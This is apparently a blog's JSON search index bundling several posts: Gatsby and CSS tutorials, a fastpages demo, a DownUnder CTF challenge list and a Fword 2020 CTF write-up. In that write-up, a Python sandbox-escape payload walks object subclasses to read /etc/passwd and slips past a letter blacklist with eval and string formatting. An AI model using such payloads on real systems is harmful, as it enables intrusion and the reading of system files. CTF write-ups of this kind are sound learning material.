{
  
    
        "post0": {
            "title": "Down Under 2020 CTF writeup",
            "content": "Text goes here. . Forensics . Spot the Difference . 327 easy Author: TheDon . An employee’s files have been captured by the first responders. The suspect has been accused of using images to leak confidential infomation, steghide has been authorised to decrypt any images for evidence! . Files: https://storage.googleapis.com/files.duc.tf/uploads/SpotTheDifference/Publish.zip (sha256: be6fd22e658b51124da5a608cc50e5fdc6698772a024cfe4dd9fb393f6ee5227) . I Love Scomo . 440 medium . I really do love Scott Morrison! &lt;3 &lt;3 &lt;3 . However, some people don’t like me because of my secret crush :(. So I have to hide my secrets using steganography. This is my hidden space, where I can dream about being with Scomo and I really appreciate that no one tries to reveal my secret message for him. . Author: ghostccamm . Attached files: . ilovescomo.jpg (sha256: c1a820c8b17c179b93a1bdf677b01080a27cec2d130e58d50117ef669b4ab9af) . web . Web Badmin . 370 easy . Author: Blue Alder . We launched a game and now it is no longer launched :( can you figure out what happened plox. HALP . https://chal.duc.tf:30102 . crypto . babyrsa . 200 easy . Author: joseph . This is just RSA for babies! . Attached files: . babyrsa.py (sha256: 37676169a895f541454f4a93a943a7718c09bd245233e1fa38eb1f85181e3fe8) output.txt (sha256: b1a705ce9efd6403006b00ecccc8225e7e103b704dc276797eafa68d26fba068) . misc . In a pickle . 200 easy . Author: n00bmaster . We managed to intercept communication between und3rm4t3r and his hacker friends. However it is obfuscated using something. We just can’t figure out what it is. Maybe you can help us find the flag? . Addition . 200 easy . Author: n00bmaster . Joe is aiming to become the next supreme coder by trying to make his code smaller and smaller. His most recent project is a simple calculator which he reckons is super secure because of the “filters” he has in place. However, he thinks that he knows more than everyone around him. Put Joe in his place and grab the flag. . Pretty Good Pitfall . 200 easy . Author: k0wa1ski#6150 . PGP/GPG/GnuPG/OpenPGP is great! I reckon you can’t find the message, because it looks scrambled! . Attached files: flag.txt.gpg (sha256: dad03ac28b7294c8696eeac21d11159c3dcfc8ed226438804fe82b4fb9f6ad87) . Tim Tams . 273 easy . Author: QUT_WH . When I eat too many Tim Tams, I get rather slow! . WARNING You will want to turn down your audio for this one! . Download: https://storage.googleapis.com/files.duc.tf/uploads/Clive.wav . File Hash (SHA256): 4C1CC12D002956A83E168CA650B776B55AAC36F2131D0DF617BE7D55DBEF93D1 . Koala Habitat . 462 easy . Author: QUT_WH . What an Aussie Banger! . Flag Format: STRING you end up with after solving challenge –&gt; Spaces seperate the words . NO DUCTF{} required . Attached files: . gumtrees.wav (sha256: E80D485C8A6F3818F9946EDE5283CDF4CCF7276A02BE76EA23A88AF21DD15843) . OSINT . Welcome to Petstagram . 100 beginner . Who is Alexandros the cat exactly? And who is this mysterious “mum” he keeps talking about? . Submit his mum’s full name in lowercase and with underscores instead of spaces, as the flag: DUCTF{name} . Author: dahlia .",
            "url": "https://blog.justinor.dev/ctf/security/2020/09/19/downunder2020-ctf.html",
            "relUrl": "/ctf/security/2020/09/19/downunder2020-ctf.html",
            "date": " • Sep 19, 2020"
        }
        
    
  
    
        ,"post1": {
            "title": "Multiple blog types in Gatsby",
            "content": "graphql is was very confusing for me to use at first, but with the ___graphql tool available during gatsby develop, I found that I could quickly learn how it works as I used it more and more. One of the issues I came across lately was trying to maintain two different markdown folders for blogs and projects respectively. . From my research, I found another guide on how to do this, but their guide was for gatsby version 1, and I found that the requirement of providing metadata for project markdown files was a bit redundant, as you will see below. So here is my guide for creating a projects folder for your project markdown files to be serve on gatsby. . Criteria . You are using a set up similar to the the gatsby starter blog. | You want a file structure like this | . src ├── content │   ├── blog │   │   ├── blog1 │   │   │   └── index.md │   │   └── blog2 │   │   └── index.md │   └── projects │   ├── project1 │   │   └── index.md │   └── project2 │   └── index.md └── src    └── templates        ├── BlogPost.tsx       └── ProjectPost.tsx . Thats it! (nothing redundant like requiring a field to be added to each projects’ index.md…) . Setting up Gatsby . In gatsby-config.js, add the following code in the plugins array: . plugins: [ ... { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/content/projects`, name: `projects`, }, }, ... ] . Next, in gatsby-node.js, we don’t need to change the graphql query at all! Instead, we need to conditionally create pages and nodes based on the path to the markdown files! . Assuming your graphql takes the fileAbsolutePath field from allMarkdownRemark / edges / nodes like so: . const result = await graphql( ` { allMarkdownRemark( sort: { fields: [frontmatter___date], order: DESC } limit: 1000 ) { edges { node { fields { slug } fileAbsolutePath frontmatter { title tags } } } } } ` ); . Then we can simply check this property to figure out whether to render this as a blog post or as a project post! . exports.createPages = async ({ graphql, actions }) =&gt; { const blogPost = path.resolve(`./src/templates/BlogPost.tsx`); const tagPage = path.resolve(`./src/templates/TagsPage.tsx`); const projectPost = path.resolve(`./src/templates/ProjectPost.tsx`); /* graphql query from above goes here */ if (result.errors) { throw result.errors; } // Create blog posts pages. const posts = result.data.allMarkdownRemark.edges; posts.forEach((post, index) =&gt; { const previous = index === posts.length - 1 ? null : posts[index + 1].node; const next = index === 0 ? null : posts[index - 1].node; createPage({ path: post.node.fields.slug, component: /blog/.test(post.node.fileAbsolutePath) ? blogPost : projectPost, context: { slug: post.node.fields.slug, previous, next, }, }); }); }; . Finally, to ensure slugs get properly created, we need to use createFilePath to create the slugs for the above command conditionally like so: . exports.onCreateNode = ({ node, actions, getNode }) =&gt; { const { createNodeField } = actions; if (node.internal.type === `MarkdownRemark`) { const value = createFilePath({ node, getNode }); createNodeField({ name: `slug`, node, value: `/${ /blog/.test(node.fileAbsolutePath) ? &#39;blog&#39; : &#39;projects&#39; }${value}`, }); } . Hooking up the frontend . This is most of the “backend” work done, and the rest of the work consists of using this data. You can probably reuse the code examples given in the first resource I have linked below, or check out the source code for this blog you’re reading right now. The harder part in my opinion was knowing how to use the absolute path in graphql in the page creation phase, as I really disliked having to label the projects markdown pages with an explicit field when I have already put it in its own folder. . Resources . building gatsby with multiple post types | making multiple content types in gatsby | .",
            "url": "https://blog.justinor.dev/gatsby/2020/09/06/multiple-blog-types.html",
            "relUrl": "/gatsby/2020/09/06/multiple-blog-types.html",
            "date": " • Sep 6, 2020"
        }
        
    
  
    
        ,"post2": {
            "title": "The Quest for a cool header design",
            "content": "When I first came up with the idea to highlight the current page with a rounded box, it sounded really easy to implement. I even decided to go really simple and make it just invert the background. So in light mode, it would be a black box which had white text insde, and the opposite for dark mode. What could go wrong? . everything. . Lets go through some of the blood sweat and tears I went through so you don’t have to go through the same! . Inverting Colors . Essentially, I saw this css-tricks article about contrasting text backgrounds which involved using the mix-blend-mode: difference; CSS on the foreground so that it would invert its background. This would work flawlessly for the dark background with white foreground, and its also the example they gave in this article: . header { background: url(black-and-white-image.jpg); } h2 { color: white; mix-blend-mode: difference; } . However, try to do it for the opposite case and things come crashing down. . Try 1: backdrop-filter . I initially tried using this CSS, which applies a filter to the background of this image - this is actually how I have blurred everything when a user clicks the sandwich menu in mobile view. When combined with contrast(2) I was able to get commendable results on chrome. However, as soon as I tried using the website with firefox, the backdrop filter was no where to be found! This is because Mozilla Firefox have hidden the feature behind an experimental flag… . Try 2: back to mix-blend-mode . So I went back to the original method, and decided on figuring out how to have this inverted color idea work for both light and dark modes. Essentially, I’ve found that I need to do the following things: . color the text normally | color the inverting div white, with mix-blend-mode: difference | wrap everything in a div which provides the colors: background: var(--color-background) | color: var(--color-text) | transitions to make toggling the color easier on the eye | . | . These things in bold took me very long to figure out~ . Especially the div that provides colors, you can’t apply the color to the body, it needs to be in a div you style, or else in Chrome it results in the mix-blend-mode failing, BUT IT WORKS FINE IN FIREFOX!! . So many times, it would either only work in chrome, only work in firefox, only dark mode works, only light mode works. Shout out to my friend who provided me support in my darkest moments, he was the one to suggesting making the inverting div white, very smart guy. . In code, here is a watered down example consisting only the color variables required to pull off this effect (note that Underline should have absolute position and overlap with the text in StyledLink): . // styles const ColorProvider = styled.div` background: var(--color-background); color: var(--color-text); transition: all 0.25s linear; `; const Underline = styled(motion.div)` mix-blend-mode: difference; background-color: white; `; const StyledLink = styled(Link)` color: var(--color-text); `; // code &lt;ColorProvider&gt; &lt;Underline /&gt; &lt;StyledLink&gt;Home&lt;/StyledLink&gt; &lt;/ColorProvider&gt;; . FOUC . Flash of Unstyled Content is a prominent problem in Gatsby, as part of the reason why it can serve content so fast is because it prebuilds all the html. Because it can serve the html so fast, more often than not, the html loads first before CSS styles are loaded in, resulting in blank white unstyled content flickering before the styles load in. I did not like this. . Try 1 - Maybe Material-ui? . I was using material-ui as its my goto web-ui toolkit. However, I nearly considered giving up this toolkit while making this website. It appeared that whenever I used their themeProvider, it would completely break my styles, display a FOUC, and transitions applied to the body did not apply to any material-ui components. . However, I soon learnt that I was mistaken, as I had followed the documentation for material-ui blindly, and used the &lt;CssBaseline /&gt; component because they used it. Short answer - this will screw up the original css in the page. This was particularly bad for my case, as I needed to define the themes with css variables or else a FOUC would occur on every page load as Gatsby would not know about the style. . However, even without &lt;CssBaseline /&gt;, things were still going sour, FOUC was showing, I was still awake at 2am trying to fix this. . Try 2 - styled(components) . TURNS OUT: I’ve been applying global styles through a component createGlobalStyle from &#39;styled-components&#39;. This applied a style to the body which set the background-color and color. It doesn’t seem to work immediately on page load, resulting in a flash of white in dark mode, before a transition to the proper color. So now, I create my own div styled with in-line CSS defining those color css variables. The result works like a charm! . const ColorProvider = styled.div` background: var(--color-background); color: var(--color-text); transition: all 0.25s linear; `; const Layout: React.FC = ({ children }) =&gt; { return ( &lt;&gt; &lt;ColorProvider&gt; &lt;Header /&gt; {children} &lt;Footer /&gt; &lt;/ColorProvider&gt; &lt;/&gt; ); }; . This is only the stuff I remembered that I fixed, there was so much trial and error, and me reloading the site 100 times, that I’ve probably forgotten half of the stuff I tried to do to fix these problems I had. .",
            "url": "https://blog.justinor.dev/frontend/gatsby/2020/09/05/the-perils-of-web-dev.html",
            "relUrl": "/frontend/gatsby/2020/09/05/the-perils-of-web-dev.html",
            "date": " • Sep 5, 2020"
        }
        
    
  
    
        ,"post3": {
            "title": "Gatsby has a lot of cool plugins",
            "content": "You may have realised that the codeblocks on this blog look really nice… . import string charset = &#39;&#39; + string.ascii_letters + string.punctuation + string.digits def generatePassword(index: int): current = index result = [] while True: remainder = current % len(charset) result.append(charset[remainder]) current = current // len(charset) return &#39;&#39;.join(result) . Believe it or not, all the blog posts on this page are formatted from a markdown file! . gatsby-remark-highlight-code . This is what is used to get those really nice looking code outputs. More information including installation can be found here. . gatsby-remark-katex . This lets me write latex in markdown!! It can be inline like $a^2+b^2=c^2$, or it can be in full size mode like so: . I=∫abf(x)g(x)dx∴I=∫abf(x)f′(x)f′(x)g(x)dx begin{aligned} I &amp;= int_{a}^{b} frac{f(x)}{g(x)} dx therefore I &amp;= int_{a}^{b} frac{f(x)}{f&amp;#x27;(x)} frac{f&amp;#x27;(x)}{g(x)} dx end{aligned}I∴I​=∫ab​g(x)f(x)​dx=∫ab​f′(x)f(x)​g(x)f′(x)​dx​ . One interesting point is that some environments I’m used to using like begin{align*} end{align*) are unavailable. Here is a list of supported latex environments and other commands you can use with $K^AT_EX$. More information here. . Future . mdx . This is something created with Gatsby in mind, a fusion between Markdown md and jsx, allowing for importing code inside a markdown file for extra utility. . There are some amazing things you can do with it right now, such as Gatsby Theme Waves, which lets you tell a story by animating changes in code blocks, powerpoints and graphs. A super cool tool, but I just got remark to work, so I will probably implement this later when there are more packages I want that require mdx. . To install mdx, you may find these links helpful: . Gatsby - How to convert an existing Gatsby blog to use MDX | Typescript typings | .",
            "url": "https://blog.justinor.dev/gatsby/frontend/javascript/2020/09/01/gatsby-is-cool.html",
            "relUrl": "/gatsby/frontend/javascript/2020/09/01/gatsby-is-cool.html",
            "date": " • Sep 1, 2020"
        }
        
    
  
    
        ,"post4": {
            "title": "Fword 2020 CTF write-up",
            "content": ". This was one of the first CTFs I’ve competed in, and I’m pretty happy with the performance we obtained. I worked on two problems, one which I didn’t get in the end. But it was still a great learning experience. I definitely got carried by the other people in my team, who did really well in the pwn section. . Problem 1 - Secret Array . TL;DR . use pwntools to interface with the IP and port, not netcat, as there is no easy way to pipe python output to netcat | DON’T name your file something generic like pwn.py or numbers.py, as those are internally used by pwntools, and will result in failures DX | don’t overengineer your answers, occam’s razor | installation steps: | . virtualenv venv . venv/bin/activate pip install pwntools . The problem was hosted in a server, and netcat was used to access it. nc secretarray.fword.wtf 1337 . The problem stated that there were 1337 unknown numbers in an array, and we were allowed to query the server with 2 valid indices, which would return the sum of the two numbers in the array at those indices. We were allowed to query the server 1337 times. . At first glance, I immediately felt like this would be a great opportunity to use np.linalg.solve, as the problem was essentially a really big simultaneous equations problem, so at first I made arbitrary guesses of the form: . for i in range(1337): if i == 1336: print(f&quot;0 1336&quot;) else: print(f&quot;{i} {i+1}&quot;) . This yielded a list of 1337 numbers, which I turned into a numpy array. I also converted my guesses into a numpy matrix like so: . matrix = np.zeros((1337,1337)) for i in range(1337): if i == 1336: matrix[i,i] = 1 matrix[i,0] = 1 else: matrix[i,i] = 1 matrix[i,i+1] = 1 matrix = matrix.astype(&#39;float64&#39;) ans = np.linalg.solve(matrix, res) for a in ans: print(a) . However, I immediately realised this wasn’t going to work when I was getting floats as my answers… . So instead, I decided to rethink my strategy, since the simulataneous equations were quite simple: . Let every element in the array be labelled like $a_{i}, i in 1,2,…,N, text{where } N=1337$. | Thinking for a simple case, where $N=3$, we see that for the following chosen indices: | . {a0+a1=b0(1)a0+a2=b1(2)a1+a2=b2(3) begin{cases} a_0 + a_1 = b_0 qquad (1) a_0 + a_2 = b_1 qquad (2) a_1 + a_2 = b_2 qquad (3) end{cases}⎩⎪⎪⎨⎪⎪⎧​a0​+a1​=b0​(1)a0​+a2​=b1​(2)a1​+a2​=b2​(3)​ . We can simply solve these by computing $(1)-(2) equiv a_1 - a_2 = b_0 - b_1$, adding this to $(3)$, we obtain | . {a0=b0−a1a1=b0−b1+b22a2=b0−a2 begin{cases} a_0 = b_0 - a_1 a_1 = frac{b_0 - b_1 + b_2}{2} a_2 = b_0 - a_2 end{cases}⎩⎪⎪⎨⎪⎪⎧​a0​=b0​−a1​a1​=2b0​−b1​+b2​​a2​=b0​−a2​​ . By solving this simplest case, we get a values for $a_0, a_1, a_2$ and we can easily extend this scenario to $N=4$ by taking the 4th simultaneous equation to be . a2+a3=b3∴a3=b3−a2 begin{aligned} a_2 + a_3 &amp;= b_3 therefore a_3 &amp;= b_3 - a_2 end{aligned}a2​+a3​∴a3​​=b3​=b3​−a2​​ . So I just coded this: . with open(&#39;output.txt&#39;,&#39;r&#39;) as f: data = f.readlines() data = [int(d[:-1]) for d in data] #strip newline # solve the first 3 answers = [0 for _ in range(1337)] answers[1] = (data[0]-data[1]+data[2])/2 answers[0] = data[0]-answers[1] answers[2] = data[2]-answers[1] for i in range(3,1337): answers[i] = data[i]-answers[i-1] # checking assert(answers[0]+answers[1] == data[0]) assert(answers[0]+answers[2] == data[1]) assert(answers[1]+answers[2] == data[2]) for i in range(3,1337): assert(answers[i-1]+answers[i] == data[i]) print(&quot;DONE &quot;+&quot; &quot;.join(str(a) for a in answers)) . Now, when I was trying to get pwntools to work, I had made the moronically called the file pwn.py which was an internal file used in pwntools, so it failed, I eventually got my friend to run the code above and he got the flag :S. . Problem 2 - Directory Manager . This one was really hard and involved a Server Side Template Injection in python. I didn’t get it this time, but here are some things I found out that might prove useful in later CTFs. . Recon . I just kept trying different inputs, here are some examples of what I got . xpirep@kali:~/dev/fword20/dir$ nc directorymanager.fword.wtf 1234 Welcome to our Directory Manager, what do you want to execute : dir &lt;built-in function dir&gt; . Some more examples include: . dir: &lt;built-in function dir&gt; file: &lt;type &#39;file&#39;&gt; exit: Use exit() or Ctrl-D (i.e. EOF) to exit anything where the second letter is an s: Thank you ! []: [] [&#39;hello&#39;]: [] [&#39;qwertyuiopadfghjklzxcvbnm,./;[] -=1234567890!@#$%^&amp;*()_+{}|:&quot;&lt;&gt;?&#39;]: [&#39;qwertyuiopadfghjklzxcvbnm,./;[] -=1234567890!@#$%^&amp;*()_+{}|:&quot;&lt;&gt;?&#39;] . Ultimately, from the output interpretations of dir and file, I was pretty sure python code was executing. However, interestingly any input that contained the letter ‘s’ would fail with Thank you !. . Intro to SSTI . In a previous challenge, I performed Server Side Template Injection (SSTI) and remote code execution (RCE) through a Flask template input by exploiting the fact that file is a built in type, and that there were certain builtin class functions that let you go from any one class to any other class. . &gt;&gt;&gt; [].__class__ &lt;type &#39;list&#39;&gt; . Here, we can abuse the .__class__ method to obtain a reference to the list object type. . &gt;&gt;&gt; [].__class__.__base__ &lt;type &#39;object&#39;&gt; . We can go further and obtain the object class like so. . &gt;&gt;&gt; [].__class__.__base__.__subclasses__() [&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;] . We can actually find the file type, by taking the 40th element in this list: . &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[40] &lt;type &#39;file&#39;&gt; . And finally, we can use this type as a function to read and print a file. . &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read() &#39;root:x:0:0:root:/root:/bin/bash ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin nbin:x:2:2:bin:/bin:/usr/sbin/nologin nsys:x:3:3:sys:/dev:/usr/sbin/nologin nsync:x:4:65534:sync:/bin:/bin/sync ngames:x:5:60:games:/usr/games:/usr/sbin/nologin nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin nfword:x:1000:1000::/home/fword/:/bin/bash nmessagebus:x:101:101::/nonexistent:/usr/sbin/nologin n&#39; . no ‘s’ . Now you can probably see why banning the letter ‘s’ would be problematic, as the letter ‘s’ appears in all the builtin functions we used to grab the file type. . However, fear not, as security engineers always find a way! . xpirep@kali:~/dev/fword20/dir$ nc directorymanager.fword.wtf 1234 Welcome to our Directory Manager, what do you want to execute : [dir()] [[&#39;__builtins__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__warningregistry__&#39;, &#39;conn&#39;, &#39;inp&#39;, &#39;isallowed&#39;, &#39;ldap&#39;]] . I found I was able to evaluate the dir() function if it was contained in a list, and lo and behold! the first element of this list has the letter ‘s’ in it~ . I grabbed this ‘s’ to see if it would pass whatever black listing was happening behind the scenes: . xpirep@kali:~/dev/fword20/dir$ nc directorymanager.fword.wtf 1234 Welcome to our Directory Manager, what do you want to execute : dir()[0][9] s . Bingo. Now, I just used the string format function to craft the payload shown in the previous section: . xpirep@kali:~/dev/fword20/dir$ nc directorymanager.fword.wtf 1234 Welcome to our Directory Manager, what do you want to execute : [eval(&#39;[].__cla{0}{0}__.__ba{0}e__.__{0}ubcla{0}{0}e{0}__()&#39;.format(dir()[0][9]))[40](&#39;/etc/pa{0}{0}wd&#39;.format(dir()[0][9])).read()] [&#39;root:x:0:0:root:/root:/bin/bash ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin nbin:x:2:2:bin:/bin:/usr/sbin/nologin nsys:x:3:3:sys:/dev:/usr/sbin/nologin nsync:x:4:65534:sync:/bin:/bin/sync ngames:x:5:60:games:/usr/games:/usr/sbin/nologin nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin nfword:x:1000:1000::/home/fword/:/bin/bash nmessagebus:x:101:101::/nonexistent:/usr/sbin/nologin n&#39;] . Although I was able to read /etc/passwd, as well as some other common files like .bashrc, without access to the os library, I was unnable to get a list of the directory, to know which file to target. . Failures . I tried a lot of different things, here’s how they worked out: . I can eval but I am blacklisted from running exec, or running eval(compile()), which means I cannot import. | I can use __import__(os).listdirs() but this is blocked from running, and black listed. Really, I spent a few hours testing random directories and possible file names for the flag, but without access to ls, I am really at a loss for knowing which file to target. Hence I was unable to get the flag in the end. | .",
            "url": "https://blog.justinor.dev/ctf/security/2020/09/01/fword2020-ctf.html",
            "relUrl": "/ctf/security/2020/09/01/fword2020-ctf.html",
            "date": " • Sep 1, 2020"
        }
        
    
  
    
        ,"post5": {
            "title": "Fastpages Notebook Blog Post",
            "content": "About . This notebook is a demonstration of some of capabilities of fastpages with notebooks. . With fastpages you can save your jupyter notebooks into the _notebooks folder at the root of your repository, and they will be automatically be converted to Jekyll compliant blog posts! . Front Matter . The first cell in your Jupyter Notebook or markdown blog post contains front matter. Front matter is metadata that can turn on/off options in your Notebook. It is formatted like this: . # &quot;My Title&quot; &gt; &quot;Awesome summary&quot; - toc:true- branch: master - badges: true - comments: true - author: Hamel Husain &amp; Jeremy Howard - categories: [fastpages, jupyter] . Setting toc: true will automatically generate a table of contents | Setting badges: true will automatically include GitHub and Google Colab links to your notebook. | Setting comments: true will enable commenting on your blog post, powered by utterances. | . The title and description need to be enclosed in double quotes only if they include special characters such as a colon. More details and options for front matter can be viewed on the front matter section of the README. . Markdown Shortcuts . A #hide comment at the top of any code cell will hide both the input and output of that cell in your blog post. . A #hide_input comment at the top of any code cell will only hide the input of that cell. . The comment #hide_input was used to hide the code that produced this. . put a #collapse-hide flag at the top of any cell if you want to hide that cell by default, but give the reader the option to show it: . import pandas as pd import altair as alt . . put a #collapse-show flag at the top of any cell if you want to show that cell by default, but give the reader the option to hide it: . cars = &#39;https://vega.github.io/vega-datasets/data/cars.json&#39; movies = &#39;https://vega.github.io/vega-datasets/data/movies.json&#39; sp500 = &#39;https://vega.github.io/vega-datasets/data/sp500.csv&#39; stocks = &#39;https://vega.github.io/vega-datasets/data/stocks.csv&#39; flights = &#39;https://vega.github.io/vega-datasets/data/flights-5k.json&#39; . . place a #collapse-output flag at the top of any cell if you want to put the output under a collapsable element that is closed by default, but give the reader the option to open it: . print(&#39;The comment #collapse-output was used to collapse the output of this cell by default but you can expand it.&#39;) . The comment #collapse-output was used to collapse the output of this cell by default but you can expand it. . . Interactive Charts With Altair . Charts made with Altair remain interactive. Example charts taken from this repo, specifically this notebook. . Example 1: DropDown . # use specific hard-wired values as the initial selected values selection = alt.selection_single( name=&#39;Select&#39;, fields=[&#39;Major_Genre&#39;, &#39;MPAA_Rating&#39;], init={&#39;Major_Genre&#39;: &#39;Drama&#39;, &#39;MPAA_Rating&#39;: &#39;R&#39;}, bind={&#39;Major_Genre&#39;: alt.binding_select(options=genres), &#39;MPAA_Rating&#39;: alt.binding_radio(options=mpaa)} ) # scatter plot, modify opacity based on selection alt.Chart(df).mark_circle().add_selection( selection ).encode( x=&#39;Rotten_Tomatoes_Rating:Q&#39;, y=&#39;IMDB_Rating:Q&#39;, tooltip=&#39;Title:N&#39;, opacity=alt.condition(selection, alt.value(0.75), alt.value(0.05)) ) . Example 2: Tooltips . alt.Chart(df).mark_circle().add_selection( alt.selection_interval(bind=&#39;scales&#39;, encodings=[&#39;x&#39;]) ).encode( alt.X(&#39;Rotten_Tomatoes_Rating&#39;, type=&#39;quantitative&#39;), alt.Y(&#39;IMDB_Rating&#39;, type=&#39;quantitative&#39;, axis=alt.Axis(minExtent=30)), # y=alt.Y(&#39;IMDB_Rating:Q&#39;, ), # use min extent to stabilize axis title placement tooltip=[&#39;Title:N&#39;, &#39;Release_Date:N&#39;, &#39;IMDB_Rating:Q&#39;, &#39;Rotten_Tomatoes_Rating:Q&#39;] ).properties( width=500, height=400 ) . Example 3: More Tooltips . label = alt.selection_single( encodings=[&#39;x&#39;], # limit selection to x-axis value on=&#39;mouseover&#39;, # select on mouseover events nearest=True, # select data point nearest the cursor empty=&#39;none&#39; # empty selection includes no data points ) # define our base line chart of stock prices base = alt.Chart().mark_line().encode( alt.X(&#39;date:T&#39;), alt.Y(&#39;price:Q&#39;, scale=alt.Scale(type=&#39;log&#39;)), alt.Color(&#39;symbol:N&#39;) ) alt.layer( base, # base line chart # add a rule mark to serve as a guide line alt.Chart().mark_rule(color=&#39;#aaa&#39;).encode( x=&#39;date:T&#39; ).transform_filter(label), # add circle marks for selected time points, hide unselected points base.mark_circle().encode( opacity=alt.condition(label, alt.value(1), alt.value(0)) ).add_selection(label), # add white stroked text to provide a legible background for labels base.mark_text(align=&#39;left&#39;, dx=5, dy=-5, stroke=&#39;white&#39;, strokeWidth=2).encode( text=&#39;price:Q&#39; ).transform_filter(label), # add text labels for stock prices base.mark_text(align=&#39;left&#39;, dx=5, dy=-5).encode( text=&#39;price:Q&#39; ).transform_filter(label), data=stocks ).properties( width=500, height=400 ) . Data Tables . You can display tables per the usual way in your blog: . df[[&#39;Title&#39;, &#39;Worldwide_Gross&#39;, &#39;Production_Budget&#39;, &#39;Distributor&#39;, &#39;MPAA_Rating&#39;, &#39;IMDB_Rating&#39;, &#39;Rotten_Tomatoes_Rating&#39;]].head() . Title Worldwide_Gross Production_Budget Distributor MPAA_Rating IMDB_Rating Rotten_Tomatoes_Rating . 0 The Land Girls 